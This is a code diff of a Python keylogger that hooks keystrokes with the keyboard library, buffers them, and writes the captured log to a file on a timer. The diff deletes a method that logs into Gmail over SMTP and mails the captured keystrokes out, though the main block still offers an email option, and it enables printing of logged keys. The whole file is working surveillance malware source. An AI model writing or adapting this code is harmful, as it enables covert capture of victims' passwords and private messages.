@@ -1,24 +1,33 @@
-import keyboard # for keylogs
-import smtplib # for sending email using SMTP protocol (gmail)
-# Timer is to make a method runs after an `interval` amount of time
+"""
+requires keyboard package
+
+- listens to keystrokes
+- save/upload stored keystrokes to a local file
+- send local file out
+
+"""
+import keyboard
+import smtplib
+
 from threading import Timer
 from datetime import datetime
 
-SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "put_real_address_here@gmail.com"
-EMAIL_PASSWORD = "put_real_pw"
+SEND_REPORT_EVERY = 10
+EMAIL_ADDRESS = ''
+EMAIL_PASSWORD = ''
 
-class Keylogger:
-    def __init__(self, interval, report_method="email"):
-        # we gonna pass SEND_REPORT_EVERY to interval
+
+class Keylogger():
+    def __init__(self, interval, report_method='file'):
+        # interval variables
         self.interval = interval
         self.report_method = report_method
-        # this is the string variable that contains the log of all
-        # the keystrokes within `self.interval`
-        self.log = ""
-        # record start & end datetimes
+        # stores logged keys
+        self.log=''
+        # start + endtimes
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
+
 
     def callback(self, event):
         """
@@ -59,18 +68,6 @@ class Keylogger:
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
 
-    def sendmail(self, email, password, message):
-        # manages a connection to an SMTP server
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-        # connect to the SMTP server as TLS mode ( for security )
-        server.starttls()
-        # login to the email account
-        server.login(email, password)
-        # send the actual message
-        server.sendmail(email, email, message)
-        # terminates the session
-        server.quit()
-
     def report(self):
         """
         This function gets called every `self.interval`
@@ -86,7 +83,7 @@ class Keylogger:
             elif self.report_method == "file":
                 self.report_to_file()
             # if you want to print in the console, uncomment below line
-            # print(f"[{self.filename}] - {self.log}")
+            print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
@@ -100,7 +97,7 @@ class Keylogger:
         self.start_dt = datetime.now()
         # start the keylogger
         keyboard.on_release(callback=self.callback)
-        # start reporting the keylogs
+        # # start reporting the keylogs
         self.report()
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
@@ -109,6 +106,7 @@ class Keylogger:
 if __name__ == "__main__":
     # if you want a keylogger to send to your email
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+
     # if you want a keylogger to record keylogs to a local file
     # (and then send it using your favorite method)
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
